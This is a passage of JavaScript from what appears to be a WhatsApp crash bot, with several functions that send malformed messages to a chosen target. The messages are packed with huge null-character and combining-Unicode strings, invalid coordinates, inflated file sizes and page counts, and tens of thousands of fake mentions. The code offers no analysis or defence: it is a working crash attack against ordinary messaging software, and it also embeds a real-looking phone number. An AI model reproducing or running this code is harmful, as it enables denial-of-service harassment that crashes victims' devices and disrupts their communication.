            should_show_system_message: true,
          }),
        },
      },
    },
  };
  let sections = [];
  for (let i = 0; i < 1; i++) {
    let largeText = "\u0000".repeat(11999);
    let deepNested = {
      title: `Section ${i + 1}`,
      highlight_label: `Highlight ${i + 1}`,
      rows: [
        {
          title: largeText,
          id: `\u0000`.repeat(999),
          subrows: [
            {
              title: `\u0000`.repeat(999),
              id: `\u0000`.repeat(999),
              subsubrows: [
                {
                  title: `\u0000`.repeat(999),
                  id: `\u0000`.repeat(999),
                },
                {
                  title: `\u0000`.repeat(999),
                  id: `\u0000`.repeat(999),
                },
              ],
            },
            {
              title: `\u0000`.repeat(999),
              id: `\u0000`.repeat(999),
            },
          ],
        },
      ],
    };
    sections.push(deepNested);
  }
  let listMessage = {
    title: "𝙾𝚅𝙴𝚁𝙻𝙾𝙰𝙳",
    sections: sections,
  };
  let msg = generateWAMessageFromContent(
    target,
    proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: proto.Message.InteractiveMessage.create({
            contextInfo: {
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
            },
            body: proto.Message.InteractiveMessage.Body.create({
              text: '💎⃢ ᴍ͜͡ᴀ͜͡ʏ͜͡ᴢ͜͡ ɪ͜͡s⃟͜͡ ʜ͜͡ᴇ͜͡ʀ͜͡ᴇ͜͡⃢↯🔥' + "ꦽ".repeat(29999),
            }),
            footer: proto.Message.InteractiveMessage.Footer.create({
              buttonParamsJson: JSON.stringify(listMessage),
            }),
            header: proto.Message.InteractiveMessage.Header.create({
              buttonParamsJson: JSON.stringify(listMessage),
              subtitle: "💎⃢ ᴍ͜͡ᴀ͜͡ʏ͜͡ᴢ͜͡ ɪ͜͡s⃟͜͡ ʜ͜͡ᴇ͜͡ʀ͜͡ᴇ͜͡⃢↯🔥" + "\u0000".repeat(9999),
              hasMediaAttachment: false,
            }),
            nativeFlowMessage:
              proto.Message.InteractiveMessage.NativeFlowMessage.create({
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: "{}",
                  },
                  {
                    name: "single_select",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                ],
              }),
          }),
        },
      },
    }),
    { userJid: target }
  );
  await ziole.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
  console.log(``);
  await ziole.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
  await ziole.relayMessage(target, messagePayload, {
    additionalNodes: virtex,
    participant: { jid: target },
  });
  console.log(``);
}
async function invc2(target, ptcp = true) {
     let msg = await generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "💎⃢ ᴍ͜͡ᴀ͜͡ʏ͜͡ᴢ͜͡ ɪ͜͡s⃟͜͡ ʜ͜͡ᴇ͜͡ʀ͜͡ᴇ͜͡ ⃢↯🔥",
                                hasMediaAttachment: false
                            },
                            body: {
                                text: "Crasher"
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "single_select",
                                        buttonParamsJson: "z"
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: "{}"
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {});

            await ziole.relayMessage(target, msg.message, {
                messageId: msg.key.id,
                participant: { jid: target }
            });
        }
    async function LocSystem(target) {
            let virtex = "⿻ᴍ͜͡ᴀ͜͡ʏ͜͡ᴢ͜͡ ɪ͜͡s⃟͜͡ ʜ͜͡ᴇ͜͡ʀ͜͡ᴇ͜͡ ⿻";
            let memekz = Date.now();

            await ziole.relayMessage(target, {
                groupMentionedMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                locationMessage: {
                                    degreesLatitude: -999.03499999999999,
                                    degreesLongitude: 999.03499999999999
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "" + "ꦾ".repeat(50000) + "@X".repeat(90000) + "𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭".repeat(90000) + "ᬃᬃ".repeat(90000) + "⿻".repeat(90000)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "⏤͟͟͞͞𝑫𝒂𝒑𝒛𝒚 𝐕𝟏⿻`" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });            
        };
  async function f10(target, Ptcp = false) {
    await ziole.relayMessage(target, {
      extendedTextMessage: {
        text: "`ᴍ͜͡ᴀ͜͡ʏ͜͡ᴢ͜͡ ɪ͜͡s⃟͜͡ ʜ͜͡ᴇ͜͡ʀ͜͡ᴇ͜͡`\n>  ͆ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺\n" + "ી".repeat(55000),
        contextInfo: {
          mentionedJid: ["62895329013688@s.whatsapp.net", ...Array.from({
            length: 15000
          }, () => "1" + Math.floor(Math.random() * 60000) + "@s.whatsapp.net")],
          stanzaId: "1234567890ABCDEF",
          participant: "62895329013688@s.whatsapp.net",
          quotedMessage: {
            callLogMesssage: {
              isVideo: false,
              callOutcome: "5",
              durationSecs: "999",
              callType: "REGULAR",
              participants: [{
                jid: "62895329013688@s.whatsapp.net",
                callOutcome: "5"
              }]
            }
          },
          remoteJid: target,
          conversionSource: " X ",
          conversionData: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
          conversionDelaySeconds: 10,
          forwardingScore: 10,
          isForwarded: false,
          quotedAd: {
            advertiserName: " X ",
            mediaType: "IMAGE",
            jpegThumbnail: fs.readFileSync("./NIKA.jpg"),
            caption: " X "
          },
          placeholderKey: {
            remoteJid: "0@s.whatsapp.net",
            fromMe: false,
            id: "ABCDEF1234567890"
          },
          expiration: 86400,
          ephemeralSettingTimestamp: "1728090592378",
          ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
          externalAdReply: {
            title: "‎᭎ᬼᬼᬼৗীি𑍅𑍑\n⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿\n𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿",
            body: "ᴍ͜͡ᴀ͜͡ʏ͜͡ᴢ͜͡ ɪ͜͡s⃟͜͡ ʜ͜͡ᴇ͜͡ʀ͜͡ᴇ͜͡",
            mediaType: "VIDEO",
            renderLargerThumbnail: true,
            previewType: "VIDEO",
            thumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/...",
            sourceType: " x ",
            sourceId: " x ",
            sourceUrl: "x",
            mediaUrl: "x",
            containsAutoReply: true,
            showAdAttribution: true,
            ctwaClid: "ctwa_clid_example",
            ref: "ref_example"
          },
          entryPointConversionSource: "entry_point_source_example",
          entryPointConversionApp: "entry_point_app_example",
          entryPointConversionDelaySeconds: 5,
          disappearingMode: {},
          actionLink: {
            url: "‎ ‎ "
          },
          groupSubject: " X ",
          parentGroupJid: "6287888888888-1234567890@g.us",
          trustBannerType: " X ",
          trustBannerAction: 1,
          isSampled: false,
          utm: {
            utmSource: " X ",
            utmCampaign: " X "
          },
          forwardedNewsletterMessageInfo: {
            newsletterJid: "6287888888888-1234567890@g.us",
            serverMessageId: 1,
            newsletterName: " X ",
            contentType: "UPDATE",
            accessibilityText: " X "
          },
          businessMessageForwardInfo: {
            businessOwnerJid: "0@s.whatsapp.net"
          },
          smbClientCampaignId: "smb_client_campaign_id_example",
          smbServerCampaignId: "smb_server_campaign_id_example",
          dataSharingContext: {
            showMmDisclosure: true
          }
        }
      }
    }, Ptcp ? {
      participant: {
        jid: target
      }
    } : {});
console.log(chalk.red.bold('𝑫𝒂𝒑𝒛𝒚 𝐕𝟏 𝐒𝐞𝐧𝐝 𝐁𝐮𝐠'))
};
async function XeonXRobust(target, Ptcp = true) {
  const jids = `_*~@0~*_\n`.repeat(10200);
  const ui = "ꦽ".repeat(10000);
  await ziole.relayMessage(target, {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "9999999999999",
              pageCount: 1316134911,
              mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
              fileName: "⏤͟͟͞͞𝑫𝒂𝒑𝒛𝒚 𝐕𝟏⿻",
              fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
              directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1726867151",
              contactVcard: true,
              jpegThumbnail: "https://img1.pixhost.to/images/6002/603809921_imgtmp.jpg"
            },
            hasMediaAttachment: true
          },
          body: {
            text: "⏤͟͟͞͞𝑫𝒂𝒑𝒛𝒚 𝐕𝟏⿻" + ui + jids
          },
          contextInfo: {
            mentionedJid: ["0@s.whatsapp.net"],
            mentions: ["0@s.whatsapp.net"]
          },
          footer: {
            text: ""
          },
          nativeFlowMessage: {},
          contextInfo: {
            mentionedJid: ["0@s.whatsapp.net", ...Array.from({
              length: 30000
            }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
            forwardingScore: 1,
            isForwarded: true,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                fileName: "⏤͟͟͞͞𝑫𝒂𝒑𝒛𝒚 𝐕𝟏⿻",
                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1724474503",
                contactVcard: true,
                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                jpegThumbnail: ""
              }
            }
          }
        }
      }
    }
  }, Ptcp ? {
    participant: {
      jid: target
    }
  } : {});
}
        async function thunderblast_doc(target) {
    const messagePayload = {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                                fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                fileLength: "999999999999",
                                pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
                                mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                fileName: `Undefined`,
                                fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1715880173"
                            },
                        hasMediaAttachment: true
                    },
                    body: {
                            text: "\u0000" + "⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷݉